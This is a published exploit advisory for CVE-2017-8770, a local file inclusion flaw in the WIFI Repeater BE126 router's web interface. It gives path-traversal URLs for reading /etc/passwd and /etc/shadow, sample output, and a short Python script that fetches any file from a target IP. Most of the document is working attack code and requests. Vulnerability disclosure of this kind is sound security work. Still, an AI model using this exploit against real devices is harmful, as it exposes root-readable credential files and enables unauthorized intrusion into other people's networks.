# Exploit Title:  WIFI Repeater BE126 – Local File Inclusion
# Date Publish: 23/08/2017
# Exploit Authors: Hay Mizrachi, Omer Kaspi

# Contact: haymizrachi@gmail.com, komerk0@gmail.com
# Vendor Homepage: http://www.twsz.com
# Category: Webapps
# Version: 1.0
# Tested on: Windows/Ubuntu 16.04

# CVE: CVE-2017-8770

1 - Description:

'getpage' HTTP parameter is not escaped in include file,

Which allow us to include local files with a root privilege user, aka /etc/password,
/etc/shadow and so on.

2 - Proof of Concept:

http://Target/cgi-bin/webproc?getpage=[LFI]

 

/etc/passwd:

http://Target/cgi-bin/webproc?getpage=../../../../etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:login=true&var:page=wizard


#root:x:0:0:root:/root:/bin/bash

root:x:0:0:root:/root:/bin/sh

#tw:x:504:504::/home/tw:/bin/bash

#tw:x:504:504::/home/tw:/bin/msh

 

/etc/shadow;

 

http://Target/cgi-bin/webproc?getpage=../../../../etc/shadow&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:login=true&var:page=wizard

 

import urllib2, httplib, sys
 
'''
	LFI PoC By Hay and Omer
'''
 
print "[+] cgi-bin/webproc exploiter [+]"
print "[+] usage: python " + __file__ + " http://<target_ip>"
 
ip_add = sys.argv[1]
fd = raw_input('[+] File or Directory: aka /etc/passwd and etc..\n')
 
print "Exploiting....."
print '\n'
URL = "http://" + ip_add + "/cgi-bin/webproc?getpage=/" + fd + "&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:login=true&var:page=wizard"
print urllib2.urlopen(URL).read()